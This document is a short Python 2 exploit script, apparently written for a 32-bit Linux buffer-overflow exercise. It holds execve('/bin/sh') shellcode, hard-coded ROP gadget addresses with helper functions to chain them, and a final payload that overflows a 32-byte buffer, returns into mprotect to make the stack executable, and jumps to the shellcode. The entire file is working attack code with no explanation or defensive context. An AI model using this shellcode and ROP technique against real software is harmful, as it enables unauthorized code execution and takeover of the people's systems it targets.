#!/usr/bin/python
import struct
def p(x):
        return struct.pack('<L',x)

PAYLOAD="jhh\x2f\x2f\x2fsh\x2fbin\x89\xe31\xc9j\x0bX\x99\xcd\x80"

ESP_NON_GDB=0xff93e560

BUFFER_ADDRESS=0xbffff730 # Find correct address
BUFFER_ADDRESS_ALIGNED=0xbffff000 # Cannot contain null bytes
INC_ECX_POINTER_ADDRESS=0x0806bcb3
POP_ECX_POP_EBX_ADDRESS=0x0805249d
MOV_ECX_POINTER_EBX_POP_EBX_ADDRESS=0x08049852
POP_EAX_ADDRESS=0x080a81d6
ZERO_EAX_ADDRESS=0x08097a7f
ADD_ECX_TO_EAX_ADDRESS=0x0806b21e

def store_ecx(value):
	return p(POP_ECX_POP_EBX_ADDRESS) + \
	       p(value) + \
		   p(0xFFFFFFFF) # Dummy that goes into EBX
		   
def store_eax(value):
	return p(POP_EAX_ADDRESS) + \
	       p(value)

def add_ecx_to_eax():
	return p(ADD_ECX_TO_EAX_ADDRESS)
		   
def zero_eax():
	return p(ZERO_EAX_ADDRESS)

def move_eax_into_what_is_pointed_by_ecx():
	return p(MOV_ECX_POINTER_EBX_POP_EBX_ADDRESS) + \
		   p(0xFFFFFFFF) # Dummy that goes into EBX

def inc_ecx_address():
	return p(INC_ECX_POINTER_ADDRESS)

def set_address_to_value_by_inc(address, value):
	return store_ecx(address) + \
		   zero_eax() + \
		   move_eax_into_what_is_pointed_by_ecx() + \
		   inc_ecx_address() * value
		   
payload = ""
payload += set_address_to_value_by_inc(0xfffffff4, 0x1000)
payload += set_address_to_value_by_inc(0xfffffff4, 0x7)

if '\x00' in payload or '\n' in payload:
	print "ERROR"
	exit(0)

payload = ""
payload += PAYLOAD
while len(payload) < 32 + 4*3: # name size + arguments
        payload += "B"
payload += p(0x08052290) # mprotect
payload += p(BUFFER_ADDRESS) # Jump to shellcode
payload += p(BUFFER_ADDRESS_ALIGNED)
payload += p(0x1000) # 4096
payload += p(0x7) # PROT_READ|PROT_WRITE|PROT_EXEC
print payload

